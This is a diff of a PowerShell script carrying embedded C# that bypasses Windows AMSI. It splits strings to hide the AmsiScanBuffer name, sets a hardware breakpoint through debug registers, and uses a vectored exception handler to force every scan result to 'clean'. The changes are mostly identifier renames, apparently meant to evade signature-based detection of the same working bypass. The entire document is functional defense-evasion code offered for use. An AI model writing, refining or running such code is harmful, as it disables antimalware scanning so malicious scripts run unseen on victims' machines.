@@ -1,6 +1,5 @@
 $HardwareBreakpoint = @"
 
-
 using System;
 using System.Collections.Generic;
 using System.Linq.Expressions;
@@ -14,107 +13,106 @@ namespace Test
 {
     // CCOB IS THE GOAT
    
-    public class Program
+    public class Application
     {
-        static string a = "msi";
-        static string b = "anB";
-        static string c = "ff";
-        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
-        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
-        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
+        static string libPrefix = "msi";
+        static string libMiddle = "anB";
+        static string libSuffix = "ff";
+        static IntPtr loadedLibraryAddress = WinAPI.LoadLibrary("a" + libPrefix + ".dll");
+        static IntPtr functionAddress = WinAPI.GetProcAddress(loadedLibraryAddress, "A" + libPrefix + "Sc" + libMiddle + "u" + libSuffix + "er");
+        static IntPtr contextPointer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
         
-        public static void SetupBypass()
+        public static void InitializeBypass()
         {
+            WinAPI.CONTEXT64 context = new WinAPI.CONTEXT64();
+            context.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;
 
-            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
-            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;
-
-            MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
-            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
+            MethodInfo exceptionHandlerMethod = typeof(Application).GetMethod("ExceptionHandler", BindingFlags.Static | BindingFlags.Public);
+            IntPtr exceptionHandlerPointer = WinAPI.AddVectoredExceptionHandler(1, exceptionHandlerMethod.MethodHandle.GetFunctionPointer());
             
             // Saving our context to a struct
-            Marshal.StructureToPtr(ctx, pCtx, true);
-            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
-            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));
+            Marshal.StructureToPtr(context, contextPointer, true);
+            bool result = WinAPI.GetThreadContext((IntPtr)(-2), contextPointer);
+            context = (WinAPI.CONTEXT64)Marshal.PtrToStructure(contextPointer, typeof(WinAPI.CONTEXT64));
 
-            EnableBreakpoint(ctx, pABuF, 0);
+            EnableHardwareBreakpoint(context, functionAddress, 0);
 
-            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
-
+            WinAPI.SetThreadContext((IntPtr)(-2), contextPointer);
         }
         
-        public static long Handler(IntPtr exceptions)
+        public static long ExceptionHandler(IntPtr exceptionsPointer)
         {
-            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
-            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));
+            WinAPI.EXCEPTION_POINTERS exceptionPointers = new WinAPI.EXCEPTION_POINTERS();
+            exceptionPointers = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptionsPointer, typeof(WinAPI.EXCEPTION_POINTERS));
 
-            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
-            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));
+            WinAPI.EXCEPTION_RECORD exceptionRecord = new WinAPI.EXCEPTION_RECORD();
+            exceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(exceptionPointers.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));
 
-            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
-            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));
+            WinAPI.CONTEXT64 contextRecord = new WinAPI.CONTEXT64();
+            contextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(exceptionPointers.pContextRecord, typeof(WinAPI.CONTEXT64));
 
-            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
+            if (exceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && exceptionRecord.ExceptionAddress == functionAddress)
             {
-                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);
+                ulong returnAddress = (ulong)Marshal.ReadInt64((IntPtr)contextRecord.Rsp);
 
                 // THE OUTPUT AMSIRESULT IS A POINTER, NOT THE EXPLICIT VALUE AAAAAAAAAA
-                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
-                //Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
-                //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));
+                IntPtr scanResultPointer = Marshal.ReadIntPtr((IntPtr)(contextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
+                //Console.WriteLine("Buffer: 0x{0:X}", (long)contextRecord.R8);
+                //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(scanResultPointer));
 
-                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);
+                Marshal.WriteInt32(scanResultPointer, 0, WinAPI.AMSI_RESULT_CLEAN);
 
-                ContextRecord.Rip = ReturnAddress;
-                ContextRecord.Rsp += 8;
-                ContextRecord.Rax = 0; // S_OK
+                contextRecord.Rip = returnAddress;
+                contextRecord.Rsp += 8;
+                contextRecord.Rax = 0; // S_OK
                 
-                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
+                Marshal.StructureToPtr(contextRecord, exceptionPointers.pContextRecord, true); //Paste our altered context back in TO THE RIGHT STRUCT
                 return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
             }
             else
             {
                 return WinAPI.EXCEPTION_CONTINUE_SEARCH;
             }
-
         }
-        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
+        
+        public static void EnableHardwareBreakpoint(WinAPI.CONTEXT64 context, IntPtr address, int index)
         {
-
             switch (index)
             {
                 case 0:
-                    ctx.Dr0 = (ulong)address.ToInt64();
+                    context.Dr0 = (ulong)address.ToInt64();
                     break;
                 case 1:
-                    ctx.Dr1 = (ulong)address.ToInt64();
+                    context.Dr1 = (ulong)address.ToInt64();
                     break;
                 case 2:
-                    ctx.Dr2 = (ulong)address.ToInt64();
+                    context.Dr2 = (ulong)address.ToInt64();
                     break;
                 case 3:
-                    ctx.Dr3 = (ulong)address.ToInt64();
+                    context.Dr3 = (ulong)address.ToInt64();
                     break;
             }
 
             //Set bits 16-31 as 0, which sets
             //DR0-DR3 HBP's for execute HBP
-            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
+            context.Dr7 = UpdateBits(context.Dr7, 16, 16, 0);
 
             //Set DRx HBP as enabled for local mode
-            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
-            ctx.Dr6 = 0;
+            context.Dr7 = UpdateBits(context.Dr7, (index * 2), 1, 1);
+            context.Dr6 = 0;
 
-            // Now copy the changed ctx into the original struct
-            Marshal.StructureToPtr(ctx, pCtx, true);
+            // Now copy the changed context into the original struct
+            Marshal.StructureToPtr(context, contextPointer, true);
         }
-        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
+        
+        public static ulong UpdateBits(ulong value, int offset, int bitCount, ulong newValue)
         {
-            ulong mask = (1UL << bits) - 1UL;
-            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
-            return dw;
+            ulong mask = (1UL << bitCount) - 1UL;
+            value = (value & ~(mask << offset)) | (newValue << offset);
+            return value;
         }
     }
+    
     public class WinAPI
     {
         public const UInt32 DBG_CONTINUE = 0x00010002;
@@ -155,6 +153,7 @@ namespace Test
 
         [DllImport("Kernel32.dll")]
         public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
+        
         [Flags]
         public enum CONTEXT64_FLAGS : uint
         {
@@ -167,6 +166,7 @@ namespace Test
             CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
             CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
         }
+        
         [StructLayout(LayoutKind.Sequential)]
         public struct M128A
         {
@@ -270,6 +270,7 @@ namespace Test
             public ulong LastExceptionToRip;
             public ulong LastExceptionFromRip;
         }
+        
         [StructLayout(LayoutKind.Sequential)]
         public struct EXCEPTION_RECORD
         {
@@ -280,6 +281,7 @@ namespace Test
             public uint NumberParameters;
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
         }
+        
         [StructLayout(LayoutKind.Sequential)]
         public struct EXCEPTION_POINTERS
         {
@@ -288,10 +290,8 @@ namespace Test
         }
     }
 }
-
-
 "@
 
 Add-Type -TypeDefinition $HardwareBreakpoint
 
-[Test.Program]::SetupBypass()
+[Test.Application]::InitializeBypass()
